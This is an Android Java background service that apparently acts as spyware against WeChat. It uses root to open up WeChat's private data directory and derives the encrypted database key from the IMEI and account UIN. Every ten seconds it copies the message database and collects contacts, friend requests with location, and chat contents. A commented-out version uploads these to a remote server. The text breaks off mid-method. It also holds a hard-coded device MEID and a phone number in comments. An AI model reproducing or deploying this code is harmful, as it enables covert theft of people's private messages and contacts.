package vicmob.micropowder.service;


import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;

import android.os.Environment;
import android.os.IBinder;

import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import net.sqlcipher.Cursor;
import net.sqlcipher.SQLException;
import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

import org.dom4j.Attribute;
import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.DocumentHelper;
import org.dom4j.Element;
import org.dom4j.io.SAXReader;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import vicmob.micropowder.config.MyApplication;
import vicmob.micropowder.http.ServiceFactory;
import vicmob.micropowder.utils.LogUtil;
import vicmob.micropowder.utils.PhoneInfo;

public class GetDataService extends Service {
    public GetDataService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    public int onStartCommand(Intent intent, int flags, int startId) {
     //执行函数入口；
        mSharedPreferences = getSharedPreferences("lz_msg_number", Context.MODE_PRIVATE); //私有数据

        PhoneInfo siminfo = new PhoneInfo(GetDataService.this);
        // 获取root权限
        execRootCmd("chmod -R 777 " + WX_ROOT_PATH);
        execRootCmd("chmod  777 /data/data/com.tencent.mm/shared_prefs/auth_info_key_prefs.xml");
//        mDeviceId= "9f4b9a2a7d14";
        mDeviceId =siminfo.getSerialNumber();
        // 获取微信的U id
        initCurrWxUin();

        startTimer();

        return super.onStartCommand(intent, flags, startId);
    }


    private static final String TAG="tgh";
    public static final String WX_ROOT_PATH = "/data/data/com.tencent.mm/";
    // U ID 文件路径
    private static final String WX_SP_UIN_PATH = WX_ROOT_PATH + "shared_prefs/auth_info_key_prefs.xml";

    private String mDbPassword;

    private static final String WX_DB_DIR_PATH = WX_ROOT_PATH + "MicroMsg";
    private List<File> mWxDbPathList = new ArrayList<>();
    private static final String WX_DB_FILE_NAME = "EnMicroMsg.db";

    private String mCurrApkPath = "/data/data/" + MyApplication.sContext.getPackageName() + "/";
    private static final String COPY_WX_DATA_DB = "wx_data.db";

    // 提交参数  mCreateTime
    private String mMsgId;
    private String mFmsgId;
    private String mLastTime;
    private int mMsgId1;
    private int mFmsgId1;
    private Long mLastTime1;


    private String IMEI="";

    private String Uin;

    public String mDeviceId;

    Timer timer;
    TimerTask mTimerTask;

    private SharedPreferences mSharedPreferences;
    @Override
    public void onCreate() {

        super.onCreate();



    }


    public void startTimer(){
        timer = new Timer();
        TelephonyManager phone = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        IMEI = phone.getDeviceId();
        System.out.println("IMEI"+IMEI);

        // 根据imei和uin生成的md5码，获取数据库的密码（去前七位的小写字母）
        initDbPassword(IMEI, Uin);

        System.out.println(mDbPassword + "数据库的密码");

        System.out.println("开始统计好友数量");

        //  递归查询微信本地数据库文件
        File wxDataDir = new File(WX_DB_DIR_PATH);
        mWxDbPathList.clear();
        searchFile(wxDataDir, WX_DB_FILE_NAME);

        System.out.println("查询数据库文件");
        //处理多账号登陆情况
        mTimerTask =new TimerTask() {
            @Override
            public void run() {

                for (int i = 0; i < mWxDbPathList.size(); i++) {
                    File file = mWxDbPathList.get(i);
                    String copyFilePath = mCurrApkPath + COPY_WX_DATA_DB;
                    //将微信数据库拷贝出来，因为直接连接微信的db，会导致微信崩溃
                    copyFile(file.getAbsolutePath(), copyFilePath);

                    File copyWxDataDb = new File(copyFilePath);

                    openWxDb(copyWxDataDb);
                  LogUtil.e(mMsgId+":" +mFmsgId +":"+ mLastTime);

                }

            }
        };
        timer.schedule(mTimerTask, 0, 10000);//10秒一获取
        Toast.makeText(this, mDbPassword, Toast.LENGTH_SHORT).show();

    }

    /**
     * 执行linux指令
     *
     * @param paramString
     */
    public void execRootCmd(String paramString) {
        try {
            Process localProcess = Runtime.getRuntime().exec("su");
            Object localObject = localProcess.getOutputStream();
            DataOutputStream localDataOutputStream = new DataOutputStream((OutputStream) localObject);
            String str = String.valueOf(paramString);
            localObject = str + "\n";
            localDataOutputStream.writeBytes((String) localObject);
            localDataOutputStream.flush();
            localDataOutputStream.writeBytes("exit\n");
            localDataOutputStream.flush();
            localProcess.waitFor();
            localObject = localProcess.exitValue();
        } catch (Exception localException) {
            localException.printStackTrace();
        }
    }

    /**
     * 获取微信的uid
     * 微信的uid存储在SharedPreferences里面
     * 存储位置\data\data\com.tencent.mm\shared_prefs\auth_info_key_prefs.xml
     */
    private void initCurrWxUin() {
        Uin = null;
        File file = new File(WX_SP_UIN_PATH);
        try {
            FileInputStream in = new FileInputStream(file);
            SAXReader saxReader = new SAXReader();
            Document document = saxReader.read(in);
            Element root = document.getRootElement();
            List<Element> elements = root.elements();
            for (Element element : elements) {
                if ("_auth_uin".equals(element.attributeValue("name"))) {
                    Uin = element.attributeValue("value");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
//            LogUtil.e("获取微信uid失败，请检查auth_info_key_prefs文件权限");
        }
    }
    /**
     * 根据imei和uin生成的md5码，获取数据库的密码（去前七位的小写字母）
     *
     * @param imei
     * @param uin
     * @return
     */
    private void initDbPassword(String imei, String uin) {
        if (TextUtils.isEmpty(imei) || TextUtils.isEmpty(uin)) {
//            Log.e("","初始化数据库密码失败：imei或uid为空");
            return;
        }
        String md5 = getMD5(imei + uin);
//        System.out.println(imei+uin+"初始数值");
        System.out.println(md5+"MD5");
        String password = md5.substring(0, 7).toLowerCase();
        System.out.println("加密后"+password);
        mDbPassword = password;
    }

    public String getMD5(String info)
    {
        try
        {
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            md5.update(info.getBytes("UTF-8"));
            byte[] encryption = md5.digest();

            StringBuffer strBuf = new StringBuffer();
            for (int i = 0; i < encryption.length; i++)
            {
                if (Integer.toHexString(0xff & encryption[i]).length() == 1)
                {
                    strBuf.append("0").append(Integer.toHexString(0xff & encryption[i]));
                }
                else
                {
                    strBuf.append(Integer.toHexString(0xff & encryption[i]));
                }
            }

            return strBuf.toString();
        }
        catch (NoSuchAlgorithmException e)
        {
            return "";
        }
        catch (UnsupportedEncodingException e)
        {
            return "";
        }
    }

    /**
     * md5加密
     *
     * @param content
     * @return
     */
    private String md5(String content) {
        MessageDigest md5 = null;
        try {
            md5 = MessageDigest.getInstance("MD5");
            md5.update(content.getBytes("UTF-8"));
            byte[] encryption = md5.digest();//加密
            StringBuffer sb = new StringBuffer();
            for (int i = 0; i < encryption.length; i++) {
                if (Integer.toHexString(0xff & encryption[i]).length() == 1) {
                    sb.append("0").append(Integer.toHexString(0xff & encryption[i]));
                } else {
                    sb.append(Integer.toHexString(0xff & encryption[i]));
                }
            }
            return sb.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    /**
     * 递归查询微信本地数据库文件
     *
     * @param file     目录
     * @param fileName 需要查找的文件名称
     */
    private void searchFile(File file, String fileName) {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files != null) {
                for (File childFile : files) {
                    searchFile(childFile, fileName);
                }
            }
        } else {
            if (fileName.equals(file.getName())) {
                mWxDbPathList.add(file);
            }
        }
    }

    /**
     * 复制单个文件
     *
     * @param oldPath String 原文件路径 如：c:/fqf.txt
     * @param newPath String 复制后路径 如：f:/fqf.txt
     * @return boolean
     */
    public void copyFile(String oldPath, String newPath) {
        try {
            int byteRead = 0;
            File oldFile = new File(oldPath);
            if (oldFile.exists()) { //文件存在时
                InputStream inStream = new FileInputStream(oldPath); //读入原文件
                FileOutputStream fs = new FileOutputStream(newPath);
                byte[] buffer = new byte[1444];
                while ((byteRead = inStream.read(buffer)) != -1) {
                    fs.write(buffer, 0, byteRead);
                }
                inStream.close();
            }
        } catch (Exception e) {
            System.out.println("复制单个文件操作出错");
            e.printStackTrace();

        }
    }
    /**
     * 连接数据库
     *
     * @param dbFile
     */
    private void openWxDb(File dbFile) {
        Context context = MyApplication.sContext;
        SQLiteDatabase.loadLibs(context);
        SQLiteDatabaseHook hook = new SQLiteDatabaseHook() {
            public void preKey(SQLiteDatabase database) {
            }

            public void postKey(SQLiteDatabase database) {
                database.rawExecSQL("PRAGMA cipher_migrate;"); //兼容2.0的数据库
            }
        };

        try {
            //打开数据库连接
            SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, mDbPassword, null, hook);
            getWxDb( db );
        } catch (Exception e) {
//            LogUtil.e("读取数据库信息失败 尝试MEID破解");
            e.printStackTrace();
            //打开数据库连接
            // 根据imei和uin生成的md5码，获取数据库的密码（去前七位的小写字母）
//            Log.i("wpan","wwewwe");
            // 请自行添加自己手机的MEID  MEID 无法直接获取
//            initDbPassword("865904030242553",  Uin);
//            SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, mDbPassword, null, hook);
//
//            getWxDb( db );


        }
    }



    /**
     * 获取本地Wx的数据
     *
     * @return
     */
//    public void getWxDb1(SQLiteDatabase db ) {
//        //已经打开数据库连接
////        SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, mDbPassword, null, hook);
//
//        Cursor selectMsgId = db.rawQuery("select * from message order by msgId desc limit 1",null);
//        while (selectMsgId.moveToNext()) {
//            mMsgId =selectMsgId.getString (selectMsgId.getColumnIndex("msgId"));
////            Log.i(TAG,"mMsgId 1="+mMsgId);
//
//        }
//
//        Cursor msgSysRowId = db.rawQuery("select * from fmessage_conversation order by fmsgSysRowId desc limit 1  ",null);
//        while (msgSysRowId.moveToNext()) {
//            mFmsgId =msgSysRowId.getString (msgSysRowId.getColumnIndex("fmsgSysRowId"));
////            Log.i(TAG,"mFmsgId ="+mFmsgId);
//        }
//        Cursor lastTime = db.rawQuery("select * from rconversation order by conversationTime desc limit 1  ",null);
//        while (lastTime.moveToNext()) {
//            mLastTime =lastTime.getString (lastTime.getColumnIndex("conversationTime"));
//            Log.i(TAG,"mLastTime ="+mLastTime);
//        }
//
//
//        if(mSharedPreferences.getString("msgId","")==null||mSharedPreferences.getString("msgId","").length()<=0){
//            mMsgId1 = 0;
//            mFmsgId1 = 0;
//            mLastTime1= 0L;
//        }
//        else {
//            mMsgId1 = Integer.parseInt(mSharedPreferences.getString("msgId", ""));
//            mFmsgId1 = Integer.parseInt(mSharedPreferences.getString("fmsgSysRowId", ""));
//            mLastTime1 = Long.parseLong(mSharedPreferences.getString("lastTime", ""));
//            //   18145639497  Log.i(TAG,"b3a54c4268453f8c5cb50ef4bf0b01e9:" +getMD5("18145639497"));
//            Log.i(TAG,"mMsgId1:*************"+Integer.toString(mMsgId1) +"mMsgId1:*************"+Long.toString(mFmsgId1));
//        }
//
//        if(mMsgId1<Integer.parseInt(mMsgId)) {
//            int maxMsgId =Integer.parseInt(mMsgId);
//            Log.i(TAG,"mMsgId 2:"+Integer.toString(mMsgId1)+")))"+Integer.toString(maxMsgId));
////                define json  array;
//            JSONArray mFmsgArray = new JSONArray();
//            JSONArray MsgContentArray = new JSONArray();
//            JSONArray mUnReadArray = new JSONArray();
//            JSONArray mContactNameArray = new JSONArray();
//
//            Cursor mContactName = db.rawQuery(" select username,alias ,conRemark,nickname,pyInitial,quanPin from rcontact; ",null);
//            if (mContactName.getCount() > 0) {
//
//                while (mContactName.moveToNext()) {
//                    String MsgAlias ="";
//                    String MsgConRemark ="";
//                    String MsgNickName ="";
//                    String MsgPyInitial="";
//                    String MsgQuanPin="";
//                    String MsgUserName = mContactName.getString(mContactName.getColumnIndex("username"));
//                    if(mContactName.getString(mContactName.getColumnIndex("alias"))!=null){
//                        MsgAlias = mContactName.getString(mContactName.getColumnIndex("alias"));
//                    }
//                    if(mContactName.getString(mContactName.getColumnIndex("conRemark"))!=null){
//                         MsgConRemark = mContactName.getString(mContactName.getColumnIndex("conRemark"));
//                    }
//                    if(mContactName.getString(mContactName.getColumnIndex("nickname"))!=null){
//                        MsgNickName = mContactName.getString(mContactName.getColumnIndex("nickname"));
//                    }
//                    if(mContactName.getString(mContactName.getColumnIndex("pyInitial"))!=null){
//                        MsgPyInitial = mContactName.getString(mContactName.getColumnIndex("pyInitial"));
//                    }
//                    if(mContactName.getString(mContactName.getColumnIndex("quanPin"))!=null){
//                         MsgQuanPin = mContactName.getString(mContactName.getColumnIndex("quanPin"));
//                    }
//
//
//                    try {
//                        JSONObject stoneObject = new JSONObject();
//                        stoneObject.put("username", MsgUserName);
//                        stoneObject.put("alias", MsgAlias);
//                        stoneObject.put("conRemark", MsgConRemark);
//                        stoneObject.put("nickname", MsgNickName);
//                        stoneObject.put("pyInitial", MsgPyInitial);
//                        stoneObject.put("quanPin", MsgQuanPin);
//
//                        mContactNameArray.put(stoneObject);
//                    } catch (Exception e) {
//                        // TODO: handle exception
//                        e.printStackTrace();
//                    }
//                    Log.i(TAG, MsgUserName + "&&&&&&" + MsgAlias + "*****" + MsgConRemark + "**&**" + MsgNickName + "******" + MsgPyInitial+ "******" + MsgQuanPin);
//                }
//            }
//            mContactName.close();
//
//
//            if(mFmsgId1 <=Integer.parseInt(mFmsgId)) {
////                    Cursor mFmsg = db.rawQuery("select isSend,talker ,encryptTalker,createTime,msgContent from fmessage_msginfo where createTime>? and  createTime<=?; ", new String[]{Integer.toString(mCreateTime1),mCreateTime});
//                Cursor mFmsg = db.rawQuery(" select fmsgSysRowId,talker ,encryptTalker,displayName,lastModifiedTime,fmsgContent,contentPhoneNumMD5 from fmessage_conversation where fmsgSysRowId>=? and  fmsgSysRowId<=?; ", new String[]{Integer.toString(mFmsgId1),mFmsgId});
//                if (mFmsg.getCount() > 0) {
//
//                    while (mFmsg.moveToNext()) {
//                        String MsgRowId = mFmsg.getString(mFmsg.getColumnIndex("fmsgSysRowId"));
//                        String MsgTalker = mFmsg.getString(mFmsg.getColumnIndex("talker"));
//                        String MsgEncryptTalker = mFmsg.getString(mFmsg.getColumnIndex("encryptTalker"));
//                        String MsgDisplayName = mFmsg.getString(mFmsg.getColumnIndex("displayName"));
//                        String MsgCreateTime = mFmsg.getString(mFmsg.getColumnIndex("lastModifiedTime"));
//                        String MsgContent = mFmsg.getString(mFmsg.getColumnIndex("fmsgContent"));
//                        String MsgPhoneNumMD5 = mFmsg.getString(mFmsg.getColumnIndex("contentPhoneNumMD5"));
//                        try {
//                            JSONObject stoneObject = new JSONObject();
//                            stoneObject.put("fmsgSysRowId", MsgRowId);
//                            stoneObject.put("talker", MsgTalker);
//                            stoneObject.put("encryptTalker", MsgEncryptTalker);
//                            stoneObject.put("displayName", MsgDisplayName);
//                            stoneObject.put("lastModifiedTime", MsgCreateTime);
//                            stoneObject.put("fmsgContent", MsgContent);
//                            stoneObject.put("contentPhoneNumMD5", MsgPhoneNumMD5);
//                            mFmsgArray.put(stoneObject);
//                        } catch (Exception e) {
//                            // TODO: handle exception
//                            e.printStackTrace();
//                        }
////                        Log.i(TAG, MsgEncryptTalker + "&&&&&&" + MsgCreateTime + "*****" + MsgRowId + "**&**" + MsgTalker );
//                    }
//                }
//                mFmsg.close();
//            }
////
//            Log.i(TAG,"mMsgId 2:"+Long.toString(mLastTime1)+"******"+mLastTime);
//            if(mLastTime1 <Long.parseLong(mLastTime)) {
////                Cursor mLast = db.rawQuery(" select username , unReadCount, isSend, conversationTime, content from rconversation   where conversationTime>? and  conversationTime<=?  ; ", new String[]{Long.toString(mLastTime1),mLastTime});
//                Cursor mLast = db.rawQuery(" select rcontact.username ,rcontact.nickname ,rconversation.unReadCount,rconversation.isSend,rconversation.conversationTime,rconversation.content from rconversation ,rcontact where conversationTime>? and  conversationTime<=? and rconversation.username=rcontact.username; ", new String[]{Long.toString(mLastTime1),mLastTime});
//                if (mLast.getCount() > 0) {
//
//                    while (mLast.moveToNext()) {
//                        String MsgUsername = mLast.getString(mLast.getColumnIndex("username"));
//                        String MsgNickname = mLast.getString(mLast.getColumnIndex("nickname"));
//                        String MsgUnReadCount = mLast.getString(mLast.getColumnIndex("unReadCount"));
//                        String MsgIsSend = mLast.getString(mLast.getColumnIndex("isSend"));
//                        String MsgTime = mLast.getString(mLast.getColumnIndex("conversationTime"));
//                        String MsgContent = mLast.getString(mLast.getColumnIndex("content"));
//
//                        try {
//                            JSONObject stoneObject = new JSONObject();
//                            stoneObject.put("username", MsgUsername);
//                            stoneObject.put("nickname", MsgNickname);
//                            stoneObject.put("unReadCount", MsgUnReadCount);
//                            stoneObject.put("isSend", MsgIsSend);
//                            stoneObject.put("conversationTime", MsgTime);
//                            stoneObject.put("content", MsgContent);
//                            mUnReadArray.put(stoneObject);
//                        } catch (Exception e) {
//                            // TODO: handle exception-
//                            e.printStackTrace();
//                        }
////                        Log.i(TAG, MsgNickname + "&&&&&&" + MsgUnReadCount + "*****" + MsgTime + "**&**" + MsgContent );
//                    }
//                }
//                mLast.close();
//            }
//
//            //
//
//            Cursor mCursor = db.rawQuery("select rcontact.username,rcontact.nickname ,message.msgId,message.isSend,message.content,message.createTime from message, rcontact where message.talker=rcontact.username and  (msgId between ? and ? );",
//                    new String[]{Integer.toString(mMsgId1),mMsgId} );
//            Log.i(TAG,"mMsgId :"+mCursor.getCount());
//            if (mCursor.getCount()>0) {
//
//                while (mCursor.moveToNext()) {
//                    String MsgTalker = mCursor.getString(mCursor.getColumnIndex("username"));
//                    String MsgNickname = mCursor.getString(mCursor.getColumnIndex("nickname"));
//                    String MsgId = mCursor.getString(mCursor.getColumnIndex("msgId"));
//                    String MsgIsSend = mCursor.getString(mCursor.getColumnIndex("isSend"));
//                    String MsgContent = mCursor.getString(mCursor.getColumnIndex("content"));
//                    String MsgCreateTime = mCursor.getString(mCursor.getColumnIndex("createTime"));
//                    try {
//                        JSONObject stoneObject = new JSONObject();
//                        stoneObject.put("msgId", MsgId);
//                        stoneObject.put("isSend", MsgIsSend);
//                        stoneObject.put("username", MsgTalker);
//                        stoneObject.put("nickname", MsgNickname);
//                        stoneObject.put("createTime", MsgCreateTime);
//                        stoneObject.put("content", MsgContent);
//                        MsgContentArray.put(stoneObject);
//                    } catch (Exception e) {
//                        // TODO: handle exception
//                        e.printStackTrace();
//                    }
////                    Log.i(TAG, MsgId + "&&&&&&" + MsgNickname + "*****" + MsgIsSend + "**&**" + MsgTalker + "******" + MsgContent);
//                }
//                mCursor.close();
//            }
//
//            String FmsgJson = mFmsgArray.toString();
//            String unReadJson = mUnReadArray.toString();
//            String msgJson = MsgContentArray.toString();
//            String contactNameJson = mContactNameArray.toString();
////            Log.i(TAG, FmsgJson);
//            Log.i(TAG, unReadJson);
////            Log.i(TAG, msgJson);
////                进行网络请求操作；
//            Call<ResponseBody> callBrand1 = ServiceFactory.getMainIns().upload_msg_json1(mDeviceId,msgJson,FmsgJson,unReadJson,contactNameJson);
//            callBrand1.enqueue(new Callback<ResponseBody>() {
//                @Override
//                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
//                    if (response.isSuccessful()) {
//                        try {
//                            String data = response.body().string();
//                            JSONObject jo = new JSONObject(data);
//                            String report = jo.optString("report");
//                            Log.i(TAG, report);
//                            if (report.equals("ok")) {
//                                Toast.makeText(GetDataService.this, "更新成功", Toast.LENGTH_SHORT).show();
//                            }
//                        } catch (IOException | JSONException e) {
//                            e.printStackTrace();
//                        }
//                    }
//                }
//                @Override
//                public void onFailure(Call<ResponseBody> call, Throwable t) {
//                }
//            });
//
//
//            SharedPreferences.Editor editor = mSharedPreferences.edit();//获取编辑器
//            editor.putString("msgId", mMsgId);
//            editor.putString("fmsgSysRowId", mFmsgId);
//            editor.putString("lastTime", mLastTime);
//            editor.commit();//提交修改
//
//        }
//        //
//
//        lastTime.close();
//        msgSysRowId.close();
//        selectMsgId.close();
//        db.close();
//    }

    /**
     * 获取本地Wx的数据
     *
     * @return
     */
    public void getWxDb(SQLiteDatabase db ) {
        //已经打开数据库连接
//        SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, mDbPassword, null, hook);

        Cursor selectMsgId = db.rawQuery("select * from message order by msgId desc limit 1",null);
        while (selectMsgId.moveToNext()) {
            mMsgId =selectMsgId.getString (selectMsgId.getColumnIndex("msgId"));
//            Log.i(TAG,"mMsgId 1="+mMsgId);

        }

        Cursor msgSysRowId = db.rawQuery("select * from fmessage_conversation order by fmsgSysRowId desc limit 1  ",null);
        while (msgSysRowId.moveToNext()) {
            mFmsgId =msgSysRowId.getString (msgSysRowId.getColumnIndex("fmsgSysRowId"));
//            Log.i(TAG,"mFmsgId ="+mFmsgId);
        }
        Cursor lastTime = db.rawQuery("select * from rconversation order by conversationTime desc limit 1  ",null);
        while (lastTime.moveToNext()) {
            mLastTime =lastTime.getString (lastTime.getColumnIndex("conversationTime"));
            Log.i(TAG,"mLastTime ="+mLastTime);
        }


        if(mSharedPreferences.getString("msgId","")==null||mSharedPreferences.getString("msgId","").length()<=0){
            mMsgId1 = 0;
            mFmsgId1 = 0;
            mLastTime1= 0L;
        }
        else {
            mMsgId1 = Integer.parseInt(mSharedPreferences.getString("msgId", ""));
            mFmsgId1 = Integer.parseInt(mSharedPreferences.getString("fmsgSysRowId", ""));
            mLastTime1 = Long.parseLong(mSharedPreferences.getString("lastTime", ""));
            //   18145639497  Log.i(TAG,"b3a54c4268453f8c5cb50ef4bf0b01e9:" +getMD5("18145639497"));
//            Log.i(TAG,"mMsgId1:*************"+Integer.toString(mMsgId1) +"mMsgId1:*************"+Long.toString(mFmsgId1));
        }

        if(mMsgId1<Integer.parseInt(mMsgId)) {
            int maxMsgId =Integer.parseInt(mMsgId);
            Log.i(TAG,"mMsgId 2:"+Integer.toString(mMsgId1)+"&&&"+Integer.toString(maxMsgId));
//                define json  array;
            JSONArray mFmsgArray = new JSONArray();
            JSONArray MsgContentArray = new JSONArray();
            JSONArray mUnReadArray = new JSONArray();
            JSONArray mContactNameArray = new JSONArray();
            JSONArray mImgLogoArray = new JSONArray();

            Cursor mContactName = db.rawQuery(" select username,alias ,conRemark,nickname,pyInitial,quanPin from rcontact; ",null);
            if (mContactName.getCount() > 0) {

                while (mContactName.moveToNext()) {
                    String MsgAlias ="";
                    String MsgConRemark ="";
                    String MsgNickName ="";
                    String MsgPyInitial="";
                    String MsgQuanPin="";
                    String MsgUserName = mContactName.getString(mContactName.getColumnIndex("username"));
                    if(mContactName.getString(mContactName.getColumnIndex("alias"))!=null){
                        MsgAlias = mContactName.getString(mContactName.getColumnIndex("alias"));
                    }
                    if(mContactName.getString(mContactName.getColumnIndex("conRemark"))!=null){
                        MsgConRemark = mContactName.getString(mContactName.getColumnIndex("conRemark"));
                    }
                    if(mContactName.getString(mContactName.getColumnIndex("nickname"))!=null){
                        MsgNickName = mContactName.getString(mContactName.getColumnIndex("nickname"));
                    }
                    if(mContactName.getString(mContactName.getColumnIndex("pyInitial"))!=null){
                        MsgPyInitial = mContactName.getString(mContactName.getColumnIndex("pyInitial"));
                    }
                    if(mContactName.getString(mContactName.getColumnIndex("quanPin"))!=null){
                        MsgQuanPin = mContactName.getString(mContactName.getColumnIndex("quanPin"));
                    }


                    try {
                        JSONObject stoneObject = new JSONObject();
                        stoneObject.put("username", MsgUserName);
                        stoneObject.put("alias", MsgAlias);
                        stoneObject.put("conRemark", MsgConRemark);
                        stoneObject.put("nickname", MsgNickName);
                        stoneObject.put("pyInitial", MsgPyInitial);
                        stoneObject.put("quanPin", MsgQuanPin);
                        mContactNameArray.put(stoneObject);
                    } catch (Exception e) {
                        // TODO: handle exception
                        e.printStackTrace();
                    }
//                    Log.i(TAG, MsgUserName + "&&&&&&" + MsgAlias + "*****" + MsgConRemark + "**&**" + MsgNickName + "******" + MsgPyInitial+ "******" + MsgQuanPin);
                }
            }
            mContactName.close();


            Cursor mImgLogo = db.rawQuery(" select username,imgflag ,reserved1,reserved2,reserved3 from img_flag; ",null);
            if (mImgLogo.getCount() > 0) {

                while (mImgLogo.moveToNext()) {
                    String MsgUserName = mImgLogo.getString(mImgLogo.getColumnIndex("username"));
                    String MsgImgFlag = mImgLogo.getString(mImgLogo.getColumnIndex("imgflag"));
                    String MsgBigLogo = mImgLogo.getString(mImgLogo.getColumnIndex("reserved1"));
                    String MsgSmallLogo = mImgLogo.getString(mImgLogo.getColumnIndex("reserved2"));
                    String MsgType = mImgLogo.getString(mImgLogo.getColumnIndex("reserved3"));

                    try {
                        JSONObject stoneObject = new JSONObject();
                        stoneObject.put("username", MsgUserName);
                        stoneObject.put("imgflag", MsgImgFlag);
                        stoneObject.put("bigLogo", MsgBigLogo);
                        stoneObject.put("smallLogo", MsgSmallLogo);
                        stoneObject.put("imgType", MsgType);

                        mImgLogoArray.put(stoneObject);
                    } catch (Exception e) {
                        // TODO: handle exception
                        e.printStackTrace();
                    }
//                    Log.i(TAG, MsgUserName + "&&&&&&" + MsgImgFlag + "*****" + MsgBigLogo + "**&**" + MsgSmallLogo + "******" + MsgType);
                }
            }
            mImgLogo.close();





            if(mFmsgId1 <=Integer.parseInt(mFmsgId)) {
//                    Cursor mFmsg = db.rawQuery("select isSend,talker ,encryptTalker,createTime,msgContent from fmessage_msginfo where createTime>? and  createTime<=?; ", new String[]{Integer.toString(mCreateTime1),mCreateTime});
                Cursor mFmsg = db.rawQuery(" select fmsgSysRowId,talker ,encryptTalker,displayName,lastModifiedTime,fmsgContent,contentPhoneNumMD5 from fmessage_conversation where fmsgSysRowId>=? and  fmsgSysRowId<=?; ", new String[]{Integer.toString(mFmsgId1),mFmsgId});
                if (mFmsg.getCount() > 0) {

                    while (mFmsg.moveToNext()) {
                        String MsgRowId = mFmsg.getString(mFmsg.getColumnIndex("fmsgSysRowId"));
                        String MsgTalker = mFmsg.getString(mFmsg.getColumnIndex("talker"));
                        String MsgEncryptTalker = mFmsg.getString(mFmsg.getColumnIndex("encryptTalker"));
                        String MsgDisplayName = mFmsg.getString(mFmsg.getColumnIndex("displayName"));
                        String MsgCreateTime = mFmsg.getString(mFmsg.getColumnIndex("lastModifiedTime"));
                        String MsgContent = mFmsg.getString(mFmsg.getColumnIndex("fmsgContent"));

                        Document doc = null;
                        Map<String, String> connectionInfo = null;
                        try {
                            doc = DocumentHelper.parseText(MsgContent);
                            Element rootElt = doc.getRootElement(); // 获取根节点
//                            System.out.println("根节点：" + rootElt.getName()); // 拿到根节点的名称
                            // 拿到根节点的名称
                            connectionInfo = new HashMap<String, String>();
                            List<Attribute> attributes = rootElt.attributes();
                            for (int i = 0; i < attributes.size(); ++i) { // 添加节点属性
                                connectionInfo.put(attributes.get(i).getName(), attributes.get(i).getValue());
                            }

                        } catch (DocumentException e) {
                            e.printStackTrace();
                        }
                        String mCountry= "";
                        String mProvince= "";
                        String mCity= "";
                        String mSex= "";
                        if(connectionInfo.get("country")!=null){
                            mCountry = connectionInfo.get("country") ;
                        }
                        if(connectionInfo.get("province")!=null){
                            mProvince = connectionInfo.get("province") ;
                        }
                        if(connectionInfo.get("city")!=null){
                            mCity = connectionInfo.get("city") ;
                        }
                        if(connectionInfo.get("sex")!=null){
                            mSex = connectionInfo.get("sex") ;
                        }
//                    String mCountry =connectionInfo.get("country") ;
//                    String mProvince =connectionInfo.get("province")  ;
//                    String mCity = connectionInfo.get("city") ;
                        Log.i(TAG,"根节点下：" +mCountry+"&&&"+mProvince+"&&&"+mCity);
//                    LogUtil.i(mCountry+"&&&"+mProvince+"&&&"+mCity);

                        String MsgPhoneNumMD5 = mFmsg.getString(mFmsg.getColumnIndex("contentPhoneNumMD5"));
                        try {
                            JSONObject stoneObject = new JSONObject();
                            stoneObject.put("fmsgSysRowId", MsgRowId);
                            stoneObject.put("talker", MsgTalker);
                            stoneObject.put("encryptTalker", MsgEncryptTalker);
                            stoneObject.put("displayName",MsgDisplayName );
                            stoneObject.put("lastModifiedTime", MsgCreateTime);
                            stoneObject.put("fmsgContent", MsgContent);
                            stoneObject.put("contentPhoneNumMD5", MsgPhoneNumMD5);
                            stoneObject.put("sex", mSex);
                            stoneObject.put("country", mCountry);
                            stoneObject.put("province", mProvince);
                            stoneObject.put("city", mCity);
                            stoneObject.put("area", mProvince+mCity);

                            mFmsgArray.put(stoneObject);
                        } catch (Exception e) {
                            // TODO: handle exception
                            e.printStackTrace();
                        }
                        Log.i(TAG, MsgDisplayName + "&&&&&&"  + mCountry + "*****" + mProvince + "**&**" + mCity);
                    }
                }
                mFmsg.close();
            }
//
            Log.i(TAG,"mMsgId 2:"+Long.toString(mLastTime1)+"******"+mLastTime);
            if(mLastTime1 <Long.parseLong(mLastTime)) {
//                Cursor mLast = db.rawQuery(" select username , unReadCount, isSend, conversationTime, content from rconversation   where conversationTime>? and  conversationTime<=?  ; ", new String[]{Long.toString(mLastTime1),mLastTime});
                Cursor mLast = db.rawQuery(" select rcontact.username ,rcontact.nickname ,rconversation.unReadCount,rconversation.isSend,rconversation.conversationTime,rconversation.content from rconversation ,rcontact where conversationTime>? and  conversationTime<=? and rconversation.username=rcontact.username; ", new String[]{Long.toString(mLastTime1),mLastTime});
                if (mLast.getCount() > 0) {

                    while (mLast.moveToNext()) {
                        String MsgUsername = mLast.getString(mLast.getColumnIndex("username"));
                        String MsgNickname = mLast.getString(mLast.getColumnIndex("nickname"));
